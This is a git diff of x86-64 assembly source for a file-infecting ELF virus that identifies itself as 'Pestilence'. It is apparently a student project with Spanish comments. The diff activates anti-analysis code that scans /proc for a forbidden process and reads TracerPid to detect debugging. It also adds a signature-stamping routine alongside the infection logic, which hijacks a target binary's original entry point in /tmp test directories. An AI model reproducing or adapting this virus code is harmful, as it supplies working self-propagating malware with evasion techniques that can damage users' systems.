@@ -54,6 +54,48 @@ section .text
         pop rax
         ret
 
+    F_set_unique_trace:
+        push rax
+        push rbx
+        push rcx
+        push rdx
+        push rdi
+        push rsi
+        mov rax, SC_GETTIME
+        mov rdi, 0
+        lea rsi, VAR(Pestilence.ts)
+        syscall
+        mov rax, VAR(Pestilence.ts)
+        mov rdi, 0x1e9
+        mul rdi
+        xor rcx, rcx
+        mov rdi, [rel Traza + 54]
+        ;mov [rdi], rax
+        .convert:
+        ;    xor rdx, rdx        ; limpiar rdx
+        ;    mov rbx, 10
+        ;     div rbx             ; rax = rax / 10
+        ;                         ; rdx = resto
+        ;     add dl, '0'         ; convertir a ASCII
+        ;    push rdx            ; guardar dígito en stack
+        ;     inc rcx
+        ;     test rax, rax
+        ;     jnz .convert
+        ; .write_loop:
+        ;     pop rax
+        ;     mov [rdi], al
+        ;     inc rdi
+        ;     loop .write_loop            
+
+        pop rsi
+        pop rdi
+        pop rdx
+        pop rcx
+        pop rbx
+        pop rax
+        ret
+    __F_set_unique_trace__end:
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -70,192 +112,192 @@ section .text
         sub rbx, rax
         mov dword VAR(Pestilence.virus_size), ebx
 
-    ; .open_proc:
-    ;     ; open("/proc", O_RDONLY, NULL)
-    ;     lea rdi, [proc]
-    ;     mov rsi, O_RDONLY
-    ;     mov rax, SC_OPEN
-    ;     syscall
-    ;     test rax, rax
-    ;     ; si falla el open de /proc, infectamos sin comprobaciones.
-    ;     jle .jump_to_host
-    ;     mov VAR(Pestilence.fd_proc), rax
+    .open_proc:
+        ; open("/proc", O_RDONLY, NULL)
+        lea rdi, [proc]
+        mov rsi, O_RDONLY
+        mov rax, SC_OPEN
+        syscall
+        test rax, rax
+        ; si falla el open de /proc, infectamos sin comprobaciones.
+        jle .jump_to_host
+        mov VAR(Pestilence.fd_proc), rax
 
-    ; .dirent_proc:
-    ;      ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
-    ;     mov rdi, VAR(Pestilence.fd_proc)
-    ;     lea rsi, VAR(Pestilence.dirent_buffer)
-    ;     mov rdx, 1024
-    ;     mov rax, SC_GETDENTS64
-    ;     syscall
-    ;     test rax, rax
-    ;     jle .check_tracerpid
-    ;     xor r12, r12
-    ;     mov rbx, rax
+    .dirent_proc:
+         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
+        mov rdi, VAR(Pestilence.fd_proc)
+        lea rsi, VAR(Pestilence.dirent_buffer)
+        mov rdx, 1024
+        mov rax, SC_GETDENTS64
+        syscall
+        test rax, rax
+        jle .check_tracerpid
+        xor r12, r12
+        mov rbx, rax
 
-    ; .check_dir_in_proc:
-    ;     ; rbx = bytes escritos en dirent_buffer
-    ;     ; r12 = contador de bytes leídos de dirent_buffer
-    ;     cmp r12, rbx
-    ;     jge .dirent_proc
+    .check_dir_in_proc:
+        ; rbx = bytes escritos en dirent_buffer
+        ; r12 = contador de bytes leídos de dirent_buffer
+        cmp r12, rbx
+        jge .dirent_proc
 
-    ;     lea rdi, VAR(Pestilence.dirent_buffer)
-    ;     add rdi, r12
+        lea rdi, VAR(Pestilence.dirent_buffer)
+        add rdi, r12
 
-    ;     ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
-    ;     movzx ecx, word [rdi + dirent.d_len]
-    ;     add r12, rcx
+        ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
+        movzx ecx, word [rdi + dirent.d_len]
+        add r12, rcx
 
-    ;     ; comprobamos si es directorio
-    ;     cmp byte [rdi + dirent.d_type], DT_DIR
-    ;     jne .check_dir_in_proc
+        ; comprobamos si es directorio
+        cmp byte [rdi + dirent.d_type], DT_DIR
+        jne .check_dir_in_proc
 
-    ;     ; comprobamos que el nombre del directorio se corresponde con un PID
-    ;     CALL_ENCRYPT (directory_name_isdigit)
-    ;     cmp al, 0
+        ; comprobamos que el nombre del directorio se corresponde con un PID
+        CALL_ENCRYPT (directory_name_isdigit)
+        cmp al, 0
 
-    ;     jne .check_dir_in_proc
+        jne .check_dir_in_proc
 
-    ; .proces_proc_dir:
+    .proces_proc_dir:
 
-    ;     mov r8, rdi   ; guardamos el puntero a la dirent struct
+        mov r8, rdi   ; guardamos el puntero a la dirent struct
 
-    ;     ; reservamos buffer destino
-    ;     sub rsp, 128
+        ; reservamos buffer destino
+        sub rsp, 128
 
-    ;     ; escribimos "/proc/" en el stack
-    ;     lea rdi, [rsp]
-    ;     lea rsi, [proc]
-    ;     mov rcx, 6
-    ;     cld
-    ;     rep movsb
+        ; escribimos "/proc/" en el stack
+        lea rdi, [rsp]
+        lea rsi, [proc]
+        mov rcx, 6
+        cld
+        rep movsb
 
-    ;     ; calculamos longitud del nombre del directorio PID
+        ; calculamos longitud del nombre del directorio PID
 
-    ;     ; rdi = puntero al nombre del directorio (string acabada en 0)
-    ;     lea rdi, [r8 + dirent.d_name]
-    ;     mov al, 0
-    ;     mov rcx, -1   ; 0xffffffffffffffff
-    ;     cld
-    ;     repne scasb
-    ;     ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
-    ;     ; hasta encontrar 0, es len + 1. (magia negra asm)
-    ;     not rcx
-    ;     dec rcx
+        ; rdi = puntero al nombre del directorio (string acabada en 0)
+        lea rdi, [r8 + dirent.d_name]
+        mov al, 0
+        mov rcx, -1   ; 0xffffffffffffffff
+        cld
+        repne scasb
+        ; El negado de 0xffffffffffffffff - el numero de veces que decrementa
+        ; hasta encontrar 0, es len + 1. (magia negra asm)
+        not rcx
+        dec rcx
 
-    ;     ; concatenamos "/proc/" + "d_name"
+        ; concatenamos "/proc/" + "d_name"
 
-    ;     lea rdi, [rsp]
-    ;     add rdi, 6
-    ;     lea rsi, [r8 + dirent.d_name]
-    ;     ; rcx ya contiene la len a escribir
-    ;     cld
-    ;     rep movsb
+        lea rdi, [rsp]
+        add rdi, 6
+        lea rsi, [r8 + dirent.d_name]
+        ; rcx ya contiene la len a escribir
+        cld
+        rep movsb
 
-    ;     ; concatenamos "/proc/d_name" + "/exe"
+        ; concatenamos "/proc/d_name" + "/exe"
 
-    ;     lea rsi, [exe_string]
-    ;     mov rcx, 5
-    ;     ; rcx ya contiene la len a escribir
-    ;     cld
-    ;     rep movsb
+        lea rsi, [exe_string]
+        mov rcx, 5
+        ; rcx ya contiene la len a escribir
+        cld
+        rep movsb
 
-    ;     ; rdi = "/proc/PID/exe"
-    ;     lea rdi, [rsp]
-    ;     sub rsp, 128
-    ;     lea rsi, [rsp]
-    ;     mov rdx, 128
-    ;     mov rax, SC_READLINK
-    ;     syscall
-    ;     test rax, rax
-    ;     ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
-    ;     jle .cleanup_and_check_dir_in_proc
+        ; rdi = "/proc/PID/exe"
+        lea rdi, [rsp]
+        sub rsp, 128
+        lea rsi, [rsp]
+        mov rdx, 128
+        mov rax, SC_READLINK
+        syscall
+        test rax, rax
+        ; esto puede pasar a menudo por permisos. Si sucede, seguimos.
+        jle .cleanup_and_check_dir_in_proc
 
-    ;     lea rdi, [forbidden_prog + 3]
-    ;     ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
-    ;     add rsi, rax
-    ;     dec rsi
-    ;     mov rcx, 4
-    ;     std
-    ;     rep cmpsb
-    ;     ; si está el forbidden program corriendo, saltamos al entrypoint
-    ;     ; original (no infectamos)
-    ;     je .cleanup_and_jump_to_host_0
+        lea rdi, [forbidden_prog + 3]
+        ; apuntamos con rsi al ultimo caracter de la cadena devuelta por readlink
+        add rsi, rax
+        dec rsi
+        mov rcx, 4
+        std
+        rep cmpsb
+        ; si está el forbidden program corriendo, saltamos al entrypoint
+        ; original (no infectamos)
+        je .cleanup_and_jump_to_host_0
 
-    ;     ; siguiente directorio.
-    ;     jmp .cleanup_and_check_dir_in_proc
+        ; siguiente directorio.
+        jmp .cleanup_and_check_dir_in_proc
 
-    ; .cleanup_and_jump_to_host_0:
-    ;     CALL_ENCRYPT (close_proc_dir)
-    ;     add rsp, 256
-    ;     jmp .jump_to_host
+    .cleanup_and_jump_to_host_0:
+        CALL_ENCRYPT (close_proc_dir)
+        add rsp, 256
+        jmp .jump_to_host
 
-    ; .cleanup_and_check_dir_in_proc:
-    ;     add rsp, 256
-    ;     jmp .check_dir_in_proc
+    .cleanup_and_check_dir_in_proc:
+        add rsp, 256
+        jmp .check_dir_in_proc
 
-    ; .check_tracerpid:
-    ;     ; abrimos /proc/self/status
-    ;     CALL_ENCRYPT (close_proc_dir)
-    ;     lea rdi, [rel status_file]
-    ;     mov rsi, O_RDONLY
-    ;     mov rax, SC_OPEN
-    ;     syscall
-    ;     test rax, rax
-    ;     jle .start_infection
+    .check_tracerpid:
+        ; abrimos /proc/self/status
+        CALL_ENCRYPT (close_proc_dir)
+        lea rdi, [rel status_file]
+        mov rsi, O_RDONLY
+        mov rax, SC_OPEN
+        syscall
+        test rax, rax
+        jle .start_infection
 
-    ;     ; guardamos el valor del fd para poder cerrarlo a posteriori
-    ;     mov VAR(Pestilence.fd_status), rax
+        ; guardamos el valor del fd para poder cerrarlo a posteriori
+        mov VAR(Pestilence.fd_status), rax
 
-    ;     ; leemos el ficherín (raro sería que midiese mas de 4KB)
-    ;     mov rdi, rax
-    ;     sub rsp, 0x1000
-    ;     lea rsi, [rsp]
-    ;     mov rdx, 0x1000
-    ;     mov rax, SC_READ
-    ;     syscall
-    ;     test rax, rax
-    ;     jle .close_status_file_and_infect
+        ; leemos el ficherín (raro sería que midiese mas de 4KB)
+        mov rdi, rax
+        sub rsp, 0x1000
+        lea rsi, [rsp]
+        mov rdx, 0x1000
+        mov rax, SC_READ
+        syscall
+        test rax, rax
+        jle .close_status_file_and_infect
 
-    ;     ; inicializamos el buffer del fichero para el rep cmpsb
-    ;     xor rbx, rbx
-    ;     lea rdi, [rsi]
+        ; inicializamos el buffer del fichero para el rep cmpsb
+        xor rbx, rbx
+        lea rdi, [rsi]
 
-    ; .search_trace:
-    ;     cmp rbx, rax
-    ;     jge .close_status_file_and_infect
+    .search_trace:
+        cmp rbx, rax
+        jge .close_status_file_and_infect
 
-    ;     ; Cuando se llama a rep cmpsb, éste shiftea los buffers de rdi y rsi
-    ;     ; tantas veces como la comparación haya sido exitosa, y devuelve en rcx
-    ;     ; el valor inicial - el numero de iteracions.
-    ;     ; Entonces por cada iteracion tenemos que resetear rcx, rsi, pero no hace
-    ;     ; falta rdi porque así se recorre el buffer del fichero a medida que se llama.
-    ;     lea rsi, [rel tracerPid_str]
-    ;     mov rcx, 0xb
-    ;     cld
-    ;     rep cmpsb
-    ;     je .check_tracerPid_value
+        ; Cuando se llama a rep cmpsb, éste shiftea los buffers de rdi y rsi
+        ; tantas veces como la comparación haya sido exitosa, y devuelve en rcx
+        ; el valor inicial - el numero de iteracions.
+        ; Entonces por cada iteracion tenemos que resetear rcx, rsi, pero no hace
+        ; falta rdi porque así se recorre el buffer del fichero a medida que se llama.
+        lea rsi, [rel tracerPid_str]
+        mov rcx, 0xb
+        cld
+        rep cmpsb
+        je .check_tracerPid_value
 
-    ;     ; rcx = 0xb - <número de comparaciones OK>
-    ;     ; rbx += 0xb - rcx
-    ;     mov rdx, 0xb
-    ;     sub rdx, rcx
-    ;     add rbx, rdx
+        ; rcx = 0xb - <número de comparaciones OK>
+        ; rbx += 0xb - rcx
+        mov rdx, 0xb
+        sub rdx, rcx
+        add rbx, rdx
 
-    ;     jmp .search_trace
+        jmp .search_trace
 
-    ; .cleanup_and_jump_to_host_1:
-    ;     add rsp, 0x1000
-    ;     call close_status_file
-    ;     jmp .jump_to_host
+    .cleanup_and_jump_to_host_1:
+        add rsp, 0x1000
+        call close_status_file
+        jmp .jump_to_host
 
-    ; .check_tracerPid_value:
-    ;     cmp byte [rdi], 0x30 ; == "0"
-    ;     jne .cleanup_and_jump_to_host_1
+    .check_tracerPid_value:
+        ;cmp byte [rdi], 0x30 ; == "0"
+        ;jne .cleanup_and_jump_to_host_1
 
-    ; .close_status_file_and_infect:
-    ;     add rsp, 0x1000
-    ;     call close_status_file
+    .close_status_file_and_infect:
+        add rsp, 0x1000
+        call close_status_file
 
     .start_infection:
         ;load dirs
@@ -417,16 +459,6 @@ section .text
         rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
 
-    .set_unique_trace:
-        mov rax, SC_GETTIME
-        mov rdi, 0
-        lea rsi, VAR(Pestilence.ts)
-        syscall
-        lea rax, VAR(Pestilence.ts)
-        mov rdi, 0x1e9
-        mul rdi
-        nop
-
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
         mov VAR(Pestilence.original_entry), rbx         ; save original_entry
@@ -438,6 +470,8 @@ section .text
         xor ecx, ecx
         mov VAR(Pestilence.note_phdr_ptr), rcx
         mov VAR(Pestilence.max_vaddr_end), rcx
+
+        call F_set_unique_trace
 
     ;rax = phnum
     ;rbx = phdr_pointer
@@ -591,7 +625,7 @@ section .text
     proc            db      "/proc/",0 ; 7
     dirs            db      "/tmp/test",0,"/tmp/test2",0,0
     Traza_position  equ     _finish - Traza
-    Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo BBBBBBBBBBBBBBBB",0  ;54
+    Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo BBBBBBBBBBBB",0  ;54
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
